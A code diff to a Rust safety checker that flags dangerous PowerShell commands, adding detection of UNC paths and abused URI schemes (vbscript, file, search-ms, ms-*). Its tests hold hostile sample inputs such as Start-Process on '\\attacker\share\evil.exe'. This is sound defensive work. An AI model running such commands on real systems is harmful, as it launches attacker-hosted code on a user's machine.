@@ -39,7 +39,9 @@ fn is_dangerous_powershell(command: &[String]) -> bool {
         .iter()
         .map(|t| t.trim_matches('\'').trim_matches('"').to_ascii_lowercase())
         .collect();
-    let has_url = args_have_url(&parsed.tokens);
+    // `shlex` (POSIX) collapses backslashes, so a `\\host\share` UNC target is
+    // mangled in the token stream. Detect it on the raw (pre-shlex) args too.
+    let has_url = args_have_url(&parsed.tokens) || raw_args_have_unc(rest);
 
     if has_url
         && tokens_lc.iter().any(|t| {
@@ -310,6 +312,18 @@ fn args_have_url(args: &[String]) -> bool {
     args.iter().any(|arg| looks_like_url(arg))
 }
 
+/// Detect a `\\host\share` UNC path in the raw (pre-shlex) argument text. The
+/// `\\` must sit at a token boundary and be followed by a hostname character so
+/// drive paths with doubled backslashes (`C:\\temp`) don't match.
+fn raw_args_have_unc(args: &[String]) -> bool {
+    static RE: Lazy<Option<Regex>> =
+        Lazy::new(|| Regex::new(r#"(?:^|[\s"'(=,])\\\\[A-Za-z0-9._-]"#).ok());
+    let Some(re) = RE.as_ref() else {
+        return false;
+    };
+    args.iter().any(|arg| re.is_match(arg))
+}
+
 fn looks_like_url(token: &str) -> bool {
     // Strip common PowerShell punctuation around inline URLs (quotes, parens, trailing semicolons).
     // Capture the middle token after trimming leading quotes/parens/whitespace and trailing
@@ -330,10 +344,38 @@ fn looks_like_url(token: &str) -> bool {
         .and_then(|caps| caps.get(1))
         .map(|m| m.as_str())
         .unwrap_or(urlish);
+
+    // UNC paths (\\host\share\evil.exe) launch executables from a remote host.
+    let trimmed = candidate.trim();
+    if trimmed.starts_with("\\\\") || trimmed.starts_with("//") {
+        return true;
+    }
+
     let Ok(url) = Url::parse(candidate) else {
         return false;
     };
-    matches!(url.scheme(), "http" | "https")
+    let scheme = url.scheme();
+    // Exclude single-character schemes so Windows drive paths (`C:\Users\...`)
+    // aren't misread as URLs.
+    if scheme.len() <= 1 {
+        return false;
+    }
+    // http/https plus other schemes commonly abused to launch code or open
+    // attacker-controlled targets via ShellExecute (`ms-settings:`, `file:`,
+    // `vbscript:`, `search-ms:`, `shell:`, any `ms-*` protocol, …).
+    matches!(
+        scheme,
+        "http"
+            | "https"
+            | "file"
+            | "ftp"
+            | "smb"
+            | "vbscript"
+            | "javascript"
+            | "data"
+            | "search-ms"
+            | "shell"
+    ) || scheme.starts_with("ms-")
 }
 
 fn executable_basename(exe: &str) -> Option<String> {
@@ -752,6 +794,41 @@ mod tests {
             "powershell",
             "-Command",
             "Get-ChildItem -Force; Remove-Item test"
+        ])));
+    }
+
+    #[test]
+    fn start_process_dangerous_schemes_and_unc_are_flagged() {
+        for target in [
+            "ms-settings:display",
+            "file:///C:/Windows/System32/calc.exe",
+            "vbscript:Execute(\"evil\")",
+            "search-ms:query=secret",
+            "\\\\attacker\\share\\evil.exe",
+        ] {
+            assert!(
+                is_dangerous_command_windows(&vec_str(&[
+                    "powershell",
+                    "-Command",
+                    &format!("Start-Process {target}"),
+                ])),
+                "expected dangerous: Start-Process {target}"
+            );
+        }
+    }
+
+    #[test]
+    fn start_process_local_exe_and_drive_path_are_not_flagged() {
+        // Plain local launches carry no scheme/UNC and must not over-prompt.
+        assert!(!is_dangerous_command_windows(&vec_str(&[
+            "powershell",
+            "-Command",
+            "Start-Process notepad.exe",
+        ])));
+        assert!(!is_dangerous_command_windows(&vec_str(&[
+            "powershell",
+            "-Command",
+            "Start-Process C:\\Windows\\System32\\notepad.exe",
         ])));
     }
 }
